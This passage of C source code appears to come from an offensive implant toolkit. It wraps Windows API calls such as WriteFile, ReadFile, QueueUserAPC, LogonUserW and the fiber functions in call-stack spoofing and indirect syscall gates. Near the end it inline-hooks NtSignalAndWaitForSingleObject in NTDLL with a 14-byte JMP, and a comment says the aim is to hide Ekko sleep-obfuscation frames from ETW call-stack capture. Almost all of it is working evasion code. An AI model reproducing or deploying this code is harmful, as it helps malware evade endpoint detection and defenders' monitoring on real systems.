        call.args[2] = spoof_arg( 0ULL );               // ApcRoutine
        call.args[3] = spoof_arg( 0ULL );               // ApcContext
        call.args[4] = spoof_arg( &iosb );
        call.args[5] = spoof_arg( (PVOID)lpBuffer );
        call.args[6] = spoof_arg( (ULONG)nNumberOfBytesToWrite );
        call.args[7] = spoof_arg( 0ULL );               // ByteOffset (NULL = pipe/sync)
        call.args[8] = spoof_arg( 0ULL );               // Key
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        if ( lpNumberOfBytesWritten ) *lpNumberOfBytesWritten = (DWORD)iosb.Information;
        return NT_SUCCESS( s );
    }
    call.ptr  = (PVOID)(KERNEL32$WriteFile);
    call.argc = 5;
    call.args[0] = spoof_arg( hFile );
    call.args[1] = spoof_arg( lpBuffer );
    call.args[2] = spoof_arg( nNumberOfBytesToWrite );
    call.args[3] = spoof_arg( lpNumberOfBytesWritten );
    call.args[4] = spoof_arg( lpOverlapped );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtReadFile.jmpAddr ) {
        CK_IO_STATUS_BLOCK iosb = { 0 };
        GATE_CALL( call, g_gates.NtReadFile );
        call.argc    = 9;
        call.args[0] = spoof_arg( hFile );
        call.args[1] = spoof_arg( 0ULL );               // Event
        call.args[2] = spoof_arg( 0ULL );               // ApcRoutine
        call.args[3] = spoof_arg( 0ULL );               // ApcContext
        call.args[4] = spoof_arg( &iosb );
        call.args[5] = spoof_arg( lpBuffer );
        call.args[6] = spoof_arg( (ULONG)nNumberOfBytesToRead );
        call.args[7] = spoof_arg( 0ULL );               // ByteOffset (NULL = pipe/sync)
        call.args[8] = spoof_arg( 0ULL );               // Key
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        if ( lpNumberOfBytesRead ) *lpNumberOfBytesRead = (DWORD)iosb.Information;
        return NT_SUCCESS( s );
    }
    call.ptr  = (PVOID)(KERNEL32$ReadFile);
    call.argc = 5;
    call.args[0] = spoof_arg( hFile );
    call.args[1] = spoof_arg( lpBuffer );
    call.args[2] = spoof_arg( nNumberOfBytesToRead );
    call.args[3] = spoof_arg( lpNumberOfBytesRead );
    call.args[4] = spoof_arg( lpOverlapped );
    return (BOOL)spoof_call( &call );
}

HMODULE WINAPI _GetModuleHandleA( LPCSTR lpModuleName )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$GetModuleHandleA);
    call.argc = 1;
    call.args[0] = spoof_arg(lpModuleName);
    return (HMODULE)spoof_call(&call);
}

/* ======================================================================== */
/* KERNEL32 — Thread management                                              */
/* ======================================================================== */

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$SuspendThread ( HANDLE hThread );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$TerminateThread( HANDLE hThread, DWORD dwExitCode );

DWORD WINAPI _SuspendThread( HANDLE hThread )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtSuspendThread.jmpAddr ) {
        ULONG prevCount = 0;
        GATE_CALL( call, g_gates.NtSuspendThread );
        call.argc    = 2;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( &prevCount );
        NTSTATUS s   = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? prevCount : (DWORD)-1;
    }
    call.ptr     = (PVOID)(KERNEL32$SuspendThread);
    call.argc    = 1;
    call.args[0] = spoof_arg( hThread );
    return (DWORD)spoof_call( &call );
}

BOOL WINAPI _TerminateThread( HANDLE hThread, DWORD dwExitCode )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtTerminateThread.jmpAddr ) {
        GATE_CALL( call, g_gates.NtTerminateThread );
        call.argc    = 2;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( (NTSTATUS)dwExitCode );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$TerminateThread);
    call.argc    = 2;
    call.args[0] = spoof_arg( hThread );
    call.args[1] = spoof_arg( dwExitCode );
    return (BOOL)spoof_call( &call );
}

/* ======================================================================== */
/* KERNEL32 — Sync / Wait / APC                                              */
/* ======================================================================== */

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds );
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$QueueUserAPC       ( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventA      ( LPSECURITY_ATTRIBUTES lpAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetEvent          ( HANDLE hEvent );

DWORD WINAPI _WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtWaitForSingleObject.jmpAddr ) {
        LARGE_INTEGER  timeout  = { 0 };
        LARGE_INTEGER *pTimeout = NULL;
        if ( dwMilliseconds != 0xFFFFFFFF ) {
            timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000LL;
            pTimeout         = &timeout;
        }
        GATE_CALL( call, g_gates.NtWaitForSingleObject );
        call.argc    = 3;
        call.args[0] = spoof_arg( hHandle );
        call.args[1] = spoof_arg( (BOOLEAN)0 );            /* Alertable = FALSE */
        call.args[2] = spoof_arg( pTimeout );
        NTSTATUS s = (NTSTATUS)spoof_call( &call );
        if ( s == (NTSTATUS)0x80000080 ) return 0x00000080; /* WAIT_ABANDONED    */
        return NT_SUCCESS( s ) ? (DWORD)s : 0xFFFFFFFF;    /* WAIT_FAILED       */
    }
    call.ptr     = (PVOID)(KERNEL32$WaitForSingleObject);
    call.argc    = 2;
    call.args[0] = spoof_arg( hHandle );
    call.args[1] = spoof_arg( dwMilliseconds );
    return (DWORD)spoof_call( &call );
}

DWORD WINAPI _QueueUserAPC( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtQueueApcThread.jmpAddr ) {
        GATE_CALL( call, g_gates.NtQueueApcThread );
        call.argc    = 5;
        call.args[0] = spoof_arg( hThread );
        call.args[1] = spoof_arg( (PVOID)pfnAPC );
        call.args[2] = spoof_arg( (PVOID)dwData );
        call.args[3] = spoof_arg( 0ULL );
        call.args[4] = spoof_arg( 0ULL );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) ) ? 1 : 0;
    }
    call.ptr     = (PVOID)(KERNEL32$QueueUserAPC);
    call.argc    = 3;
    call.args[0] = spoof_arg( pfnAPC );
    call.args[1] = spoof_arg( hThread );
    call.args[2] = spoof_arg( dwData );
    return (DWORD)spoof_call( &call );
}

HANDLE WINAPI _CreateEventA( LPSECURITY_ATTRIBUTES lpAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName )
{
    FUNCTION_CALL call = { 0 };
    /* Named events need a Unicode OBJECT_ATTRIBUTES — fall back to Win32 */
    if ( g_gates.NtCreateEvent.jmpAddr && lpName == NULL ) {
        HANDLE   hEvent    = NULL;
        /* NotificationEvent=0 (manual), SynchronizationEvent=1 (auto) */
        ULONG    eventType = bManualReset ? 0 : 1;
        GATE_CALL( call, g_gates.NtCreateEvent );
        call.argc    = 5;
        call.args[0] = spoof_arg( &hEvent );
        call.args[1] = spoof_arg( (ULONG)0x1F0003 );       /* EVENT_ALL_ACCESS */
        call.args[2] = spoof_arg( 0ULL );                  /* ObjectAttributes */
        call.args[3] = spoof_arg( eventType );
        call.args[4] = spoof_arg( (BOOLEAN)bInitialState );
        NTSTATUS s   = (NTSTATUS)spoof_call( &call );
        return NT_SUCCESS( s ) ? hEvent : NULL;
    }
    call.ptr     = (PVOID)(KERNEL32$CreateEventA);
    call.argc    = 4;
    call.args[0] = spoof_arg( lpAttributes );
    call.args[1] = spoof_arg( bManualReset );
    call.args[2] = spoof_arg( bInitialState );
    call.args[3] = spoof_arg( lpName );
    return (HANDLE)spoof_call( &call );
}

BOOL WINAPI _SetEvent( HANDLE hEvent )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtSetEvent.jmpAddr ) {
        GATE_CALL( call, g_gates.NtSetEvent );
        call.argc    = 2;
        call.args[0] = spoof_arg( hEvent );
        call.args[1] = spoof_arg( 0ULL );                  /* PreviousState = NULL */
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr     = (PVOID)(KERNEL32$SetEvent);
    call.argc    = 1;
    call.args[0] = spoof_arg( hEvent );
    return (BOOL)spoof_call( &call );
}

/* ======================================================================== */
/* ADVAPI32 — Token Info (additional)                                        */
/* ======================================================================== */

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation( HANDLE TokenHandle, DWORD TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength );
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LogonUserW         ( LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken );

BOOL WINAPI _GetTokenInformation( HANDLE TokenHandle, DWORD TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength )
{
    FUNCTION_CALL call = { 0 };
    if ( g_gates.NtQueryInformationToken.jmpAddr ) {
        GATE_CALL( call, g_gates.NtQueryInformationToken );
        call.argc    = 5;
        call.args[0] = spoof_arg( TokenHandle );
        call.args[1] = spoof_arg( (ULONG)TokenInformationClass );
        call.args[2] = spoof_arg( TokenInformation );
        call.args[3] = spoof_arg( (ULONG)TokenInformationLength );
        call.args[4] = spoof_arg( ReturnLength );
        return NT_SUCCESS( (NTSTATUS)spoof_call( &call ) );
    }
    call.ptr  = (PVOID)(ADVAPI32$GetTokenInformation);
    call.argc = 5;
    call.args[0] = spoof_arg( TokenHandle );
    call.args[1] = spoof_arg( TokenInformationClass );
    call.args[2] = spoof_arg( TokenInformation );
    call.args[3] = spoof_arg( TokenInformationLength );
    call.args[4] = spoof_arg( ReturnLength );
    return (BOOL)spoof_call( &call );
}

BOOL WINAPI _LogonUserW( LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(ADVAPI32$LogonUserW);
    call.argc = 6;
    call.args[0] = spoof_arg(lpszUsername);
    call.args[1] = spoof_arg(lpszDomain);
    call.args[2] = spoof_arg(lpszPassword);
    call.args[3] = spoof_arg(dwLogonType);
    call.args[4] = spoof_arg(dwLogonProvider);
    call.args[5] = spoof_arg(phToken);
    return (BOOL)spoof_call(&call);
}

/* ======================================================================== */
/* KERNEL32 — Fiber                                                          */
/* ======================================================================== */

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$ConvertThreadToFiberEx( LPVOID lpParameter, DWORD dwFlags );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ConvertFiberToThread  ( VOID );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$SwitchToFiber         ( LPVOID lpFiber );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$CreateFiberEx         ( SIZE_T dwStackCommitSize, SIZE_T dwStackReserveSize, DWORD dwFlags, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter );

LPVOID WINAPI _ConvertThreadToFiberEx( LPVOID lpParameter, DWORD dwFlags )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$ConvertThreadToFiberEx);
    call.argc = 2;
    call.args[0] = spoof_arg(lpParameter);
    call.args[1] = spoof_arg(dwFlags);
    return (LPVOID)spoof_call(&call);
}

BOOL WINAPI _ConvertFiberToThread( VOID )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$ConvertFiberToThread);
    call.argc = 0;
    return (BOOL)spoof_call(&call);
}

VOID WINAPI _SwitchToFiber( LPVOID lpFiber )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$SwitchToFiber);
    call.argc = 1;
    call.args[0] = spoof_arg(lpFiber);
    spoof_call(&call);
}

LPVOID WINAPI _CreateFiberEx( SIZE_T dwStackCommitSize, SIZE_T dwStackReserveSize, DWORD dwFlags, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter )
{
    FUNCTION_CALL call = { 0 };
    call.ptr  = (PVOID)(KERNEL32$CreateFiberEx);
    call.argc = 5;
    call.args[0] = spoof_arg(dwStackCommitSize);
    call.args[1] = spoof_arg(dwStackReserveSize);
    call.args[2] = spoof_arg(dwFlags);
    call.args[3] = spoof_arg(lpStartAddress);
    call.args[4] = spoof_arg(lpParameter);
    return (LPVOID)spoof_call(&call);
}

/* ======================================================================== */
/* NTDLL inline hook — NtSignalAndWaitForSingleObject (Ekko callstack fix)  */
/*                                                                           */
/* Ekko resolved APIs via hash-walking, bypassing Crystal Palace's IAT      */
/* hooks. We patch the NTDLL stub directly with a 14-byte absolute JMP so   */
/* spoof_call fires regardless, hiding all Ekko PIC-callback frames from    */
/* ETW callstack capture.                                                    */
/* ======================================================================== */

static NTSTATUS NTAPI _ntSAWFSO_handler(
    HANDLE         SignalHandle,
    HANDLE         WaitHandle,
    BOOLEAN        Alertable,
    PLARGE_INTEGER Timeout );

void ekko_hooks_setup( PVOID ntdll, FARPROC gpa )
{
    if ( !g_gates.NtSignalAndWaitForSingleObject.jmpAddr )
        return;

    typedef FARPROC (WINAPI *pfnGPA)( HMODULE, LPCSTR );
    PVOID target = (PVOID)( (pfnGPA)gpa )( (HMODULE)ntdll, "NtSignalAndWaitForSingleObject" );
    if ( !target )
        return;

    PVOID  page    = target;
    SIZE_T size    = 14;
    ULONG  oldProt = 0;
    ULONG  dummy   = 0;

    FUNCTION_CALL call = { 0 };

    /* make the page writable */
    GATE_CALL( call, g_gates.NtProtectVirtualMemory );
    call.argc    = 5;
    call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
    call.args[1] = spoof_arg( &page );
    call.args[2] = spoof_arg( &size );
    call.args[3] = spoof_arg( (ULONG)PAGE_EXECUTE_READWRITE );
    call.args[4] = spoof_arg( &oldProt );
    spoof_call( &call );

    /* write 14-byte absolute JMP: FF 25 00 00 00 00 <8-byte addr> */
    BYTE  *dst  = (BYTE *)target;
    PVOID  hook = (PVOID)_ntSAWFSO_handler;
    dst[0] = 0xFF; dst[1] = 0x25;
    dst[2] = dst[3] = dst[4] = dst[5] = 0x00;
    *(PVOID *)(dst + 6) = hook;

    /* restore original protection */
    page = target;
    size = 14;
    GATE_CALL( call, g_gates.NtProtectVirtualMemory );
    call.argc    = 5;
    call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
    call.args[1] = spoof_arg( &page );
    call.args[2] = spoof_arg( &size );
    call.args[3] = spoof_arg( oldProt );
    call.args[4] = spoof_arg( &dummy );
    spoof_call( &call );
}

static NTSTATUS NTAPI _ntSAWFSO_handler(
    HANDLE         SignalHandle,
    HANDLE         WaitHandle,
    BOOLEAN        Alertable,
    PLARGE_INTEGER Timeout )
{
    FUNCTION_CALL call = { 0 };
    GATE_CALL( call, g_gates.NtSignalAndWaitForSingleObject );
    call.argc    = 4;
    call.args[0] = spoof_arg( SignalHandle );
    call.args[1] = spoof_arg( WaitHandle );
    call.args[2] = spoof_arg( (ULONG_PTR)(BOOLEAN)Alertable );
    call.args[3] = spoof_arg( Timeout );
    return (NTSTATUS)spoof_call( &call );
}
